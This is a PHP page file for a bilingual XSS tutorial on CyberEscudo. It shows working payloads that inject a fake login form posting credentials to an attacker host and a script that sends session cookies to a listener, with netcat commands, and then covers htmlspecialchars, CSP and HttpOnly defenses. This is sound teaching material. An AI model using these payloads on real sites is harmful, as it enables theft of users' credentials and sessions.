<?php
require_once __DIR__ . '/../bootstrap.php';
$pageTitle    = $lang==='es' ? 'XSS: Captura de Cookies y Formularios Falsos — CyberEscudo' : 'XSS: Cookie Theft & Fake Forms — CyberEscudo';
$contentTitle = $lang==='es' ? 'XSS: Captura de Cookies y Formularios Falsos' : 'XSS: Cookie Theft & Fake Forms';
$contentDate  = '2022-01-01';
$contentTags  = ['XSS','Cross-Site Scripting','Netcat','Cookies','PHP'];
ob_start();
if ($lang==='es'): ?>
<div class="prose">
  <p>Práctica sobre ataques <strong>Cross-Site Scripting (XSS)</strong>. El XSS ocurre cuando una aplicación web incluye datos no confiables en una página web sin la validación o el escape adecuados. Esto permite a un atacante ejecutar scripts maliciosos (normalmente JavaScript) en el navegador de la víctima.</p>

  <h3>Tipos de XSS</h3>
  <ul>
      <li><strong>Reflejado (Reflected):</strong> El script malicioso viene de la solicitud web actual (por ejemplo, en un parámetro de búsqueda en la URL) y se "refleja" inmediatamente en la pantalla.</li>
      <li><strong>Persistente (Stored):</strong> El script se guarda en el servidor (por ejemplo, en un comentario de un blog) y se ejecuta cada vez que cualquier usuario visita esa página.</li>
  </ul>

  <h2>1. Envío de credenciales (Phishing vía XSS)</h2>
  <p>Podemos usar XSS para inyectar HTML, no solo JavaScript. Aquí inyectaremos un formulario de login falso sobre la página legítima. Ponemos Netcat en escucha en el puerto deseado:</p>
  <pre><code>nc -lvp 1337</code></pre>
  <p>Inyectamos el siguiente payload en un campo vulnerable (como una sección de comentarios). El formulario sobrescribe visualmente la web y envía las credenciales directamente a nuestra máquina (10.0.2.15):</p>
  <pre><code>&lt;script&gt;alert('Por favor, inicia sesion para continuar')&lt;/script&gt;
&lt;h3&gt;Para continuar navegando, inicie sesión&lt;/h3&gt;
&lt;form action="http://10.0.2.15:1337"&gt;
  Username:&lt;br&gt;
  &lt;input type="text" name="username"&gt;&lt;br&gt;
  Password:&lt;br&gt;
  &lt;input type="password" name="password"&gt;&lt;br&gt;
  &lt;input type="submit" value="Login"&gt;
&lt;/form&gt;</code></pre>
  <p><em>Tip de Red Team:</em> Con la API de <em>Speech Synthesis</em> nativa de JS podemos hacer el engaño más convincente añadiendo una voz robótica que pida el inicio de sesión.</p>

  <h2>2. Robo silencioso de Cookies de Sesión</h2>
  <p>La función <code>document.cookie</code> devuelve las cookies del navegador. Si la cookie de sesión no está protegida, podemos robarla para suplantar la identidad de la víctima. Usaremos un payload que crea una imagen invisible, forzando al navegador a hacer una petición a nuestro servidor con la cookie adjunta en la URL.</p>
  <pre><code>&lt;script&gt;
var img = new Image();
img.src = "http://10.0.2.15:800/log.php?c=" + document.cookie;
&lt;/script&gt;</code></pre>
  <p>En nuestro listener (<code>nc -lvp 800</code>) recibiremos una petición GET silenciosa con la cookie de sesión del administrador.</p>

  <!-- ─── SECCIÓN DEL RETO CTF 03 (ESPAÑOL) ─── -->
  <div style="margin: 3rem 0; padding: 1.5rem; background: rgba(0, 255, 255, 0.05); border-left: 4px solid var(--cyan); border-radius: 4px;">
      <h3 style="margin-top: 0; color: var(--cyan); display: flex; align-items: center; gap: 10px;">
          <span style="animation: pulse 2s infinite;">🔴</span> Laboratorio Interactivo
      </h3>
      <p style="margin-bottom: 1.5rem;">He preparado un simulador de un <strong>Buscador de Artículos</strong> vulnerable a XSS Reflejado. Intenta ejecutar un script básico o intentar robar las cookies del entorno simulado.</p>
      <a href="/ctf/ctf-03.php" style="display: inline-block; padding: 8px 20px; background: transparent; border: 1px solid var(--cyan); color: var(--cyan); text-decoration: none; font-family: var(--mono); transition: all 0.3s; font-size: 0.9rem;" onmouseover="this.style.background='var(--cyan)'; this.style.color='#000';" onmouseout="this.style.background='transparent'; this.style.color='var(--cyan)';">
          &gt;_ INICIAR RETO CTF 03
      </a>
  </div>

  <h2>3. Contramedida: htmlspecialchars()</h2>
  <p>La regla de oro contra el XSS es: <strong>Nunca confíes en el input del usuario</strong>. En PHP, <code>htmlspecialchars()</code> convierte los caracteres especiales en entidades HTML seguras:</p>
  <pre><code>&lt;?php
// Antes de mostrar cualquier entrada de usuario en pantalla:
$input = htmlspecialchars($_POST['comentario'], ENT_QUOTES, 'UTF-8');
echo $input;
?&gt;</code></pre>
  <p>Caracteres que escapa de forma segura:</p>
  <ul>
      <li><code>&lt;</code> se convierte en <code>&amp;lt;</code></li>
      <li><code>&gt;</code> se convierte en <code>&amp;gt;</code></li>
      <li><code>"</code> se convierte en <code>&amp;quot;</code></li>
  </ul>
  <p>Resultado: Si el atacante inyecta <code>&lt;script&gt;</code>, el navegador lo renderiza literalmente en pantalla como texto plano, arruinando el ataque.</p>

  <h2>Otras defensas en profundidad</h2>
  <ul>
    <li><strong>Content Security Policy (CSP)</strong>: Cabecera HTTP que restringe de dónde se puede cargar JavaScript, mitigando la carga de scripts externos.</li>
    <li><strong>Flag HTTPOnly en cookies</strong>: Marca las cookies de sesión como inaccesibles mediante JavaScript (<code>document.cookie</code> devolverá vacío).</li>
  </ul>
</div>

<?php else: ?>
<div class="prose">
  <p>Practice exercises on <strong>Cross-Site Scripting (XSS)</strong> attacks. XSS occurs when an application includes untrusted data in a web page without proper validation or escaping, allowing attackers to execute malicious scripts in the victim's browser.</p>

  <h3>Types of XSS</h3>
  <ul>
      <li><strong>Reflected:</strong> The injected script is bounced off the web server (e.g., in a search query) and executed immediately.</li>
      <li><strong>Stored:</strong> The script is permanently stored on the target servers (e.g., in a database via a comment section) and executed when victims view the stored content.</li>
  </ul>

  <h2>1. Credential Theft via XSS + Netcat (Fake Forms)</h2>
  <p>We can inject HTML to craft a fake login prompt. Set up a Netcat listener:</p>
  <pre><code">nc -lvp 1337</code></pre>
  <p>Inject this payload to overlay a fake form that posts credentials directly to your attacking machine:</p>
  <pre><code>&lt;h3&gt;Session expired — please sign in again&lt;/h3&gt;
&lt;form action="http://10.0.2.15:1337"&gt;
  Username: &lt;input type="text" name="username"&gt;
  Password: &lt;input type="password" name="password"&gt;
  &lt;input type="submit" value="Log In"&gt;
&lt;/form&gt;</code></pre>

  <h2>2. Silent Session Cookie Theft</h2>
  <p>If session cookies aren't protected with the HttpOnly flag, we can steal them using <code>document.cookie</code>. This payload creates an invisible image to force an HTTP GET request to our server, appending the cookie to the URL.</p>
  <pre><code>&lt;script&gt;
var img=new Image();
img.src="http://10.0.2.15:800/log.php?c="+document.cookie;
&lt;/script&gt;</code></pre>

  <!-- ─── SECCIÓN DEL RETO CTF 03 (INGLÉS) ─── -->
  <div style="margin: 3rem 0; padding: 1.5rem; background: rgba(0, 255, 255, 0.05); border-left: 4px solid var(--cyan); border-radius: 4px;">
      <h3 style="margin-top: 0; color: var(--cyan); display: flex; align-items: center; gap: 10px;">
          <span style="animation: pulse 2s infinite;">🔴</span> Interactive Lab
      </h3>
      <p style="margin-bottom: 1.5rem;">I've prepared a simulated <strong>Article Search Engine</strong> vulnerable to Reflected XSS. Try to pop a basic alert or steal the simulated environment cookies.</p>
      <a href="/ctf/ctf-03.php" style="display: inline-block; padding: 8px 20px; background: transparent; border: 1px solid var(--cyan); color: var(--cyan); text-decoration: none; font-family: var(--mono); transition: all 0.3s; font-size: 0.9rem;" onmouseover="this.style.background='var(--cyan)'; this.style.color='#000';" onmouseout="this.style.background='transparent'; this.style.color='var(--cyan)';">
          &gt;_ START CTF 03 CHALLENGE
      </a>
  </div>

  <h2>3. Defense: htmlspecialchars()</h2>
  <p>The golden rule is to never trust user input. In PHP, <code>htmlspecialchars()</code> converts special characters into safe HTML entities:</p>
  <pre><code>&lt;?php
$input = htmlspecialchars($_POST['comment'], ENT_QUOTES, 'UTF-8');
echo $input;
?&gt;</code></pre>
  <p>Characters escaped: <code>&lt;</code> becomes <code>&amp;lt;</code>, <code>&gt;</code> becomes <code>&amp;gt;</code>. The script tag renders safely as plain text instead of executing in the DOM.</p>

  <h2>Additional Countermeasures</h2>
  <ul>
    <li><strong>Content Security Policy (CSP):</strong> HTTP header that dictates which dynamic resources are allowed to load.</li>
    <li><strong>HTTPOnly cookies:</strong> Blocks client-side scripts (JavaScript) from accessing session cookies.</li>
  </ul>
</div>
<?php endif;
$contentBody=ob_get_clean();
require __DIR__.'/../templates/content-page.php';